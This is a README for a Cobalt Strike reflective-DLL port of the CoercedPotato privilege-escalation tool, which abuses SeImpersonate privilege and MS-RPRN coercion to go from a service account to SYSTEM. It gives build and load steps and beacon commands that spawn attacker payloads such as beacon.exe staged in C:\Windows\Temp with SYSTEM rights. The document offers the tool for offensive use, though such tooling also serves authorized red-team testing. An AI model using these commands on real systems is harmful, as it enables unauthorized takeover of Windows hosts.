# Coerced Potato Reflective DLL

Privilege escalation from NT Service to SYSTEM using SeImpersonateToken privilege and MS-RPRN functions.

Heavily based on https://github.com/Prepouce/CoercedPotato

Reflective Loader from https://github.com/stephenfewer/ReflectiveDLLInjection.


Create Reflective DLL for Cobalt Strike on https://sokarepo.github.io/redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html

## Install

Clone this repo and compile the project in VisualStudio then load `dist/coercedpotato.cna` into CobaltStrike.

## Usage

You first need to spawn the RPC listener with
```
beacon> CoercedPotato spawn ProcessToSpawn OptionalCmdArgument
```

for example
```
beacon> CoercedPotato spawn C:\Windows\Temp\beacon.exe
beacon> CoercedPotato spawn C:\Windows\Temp\loader.exe C:\Windows\Temp\beacon.bin
```

then you can trigger a SYSTEM call
```
beacon> CoercedPotato coerce
```

<p align="center">
  <img src="images/poc.png">
</p>
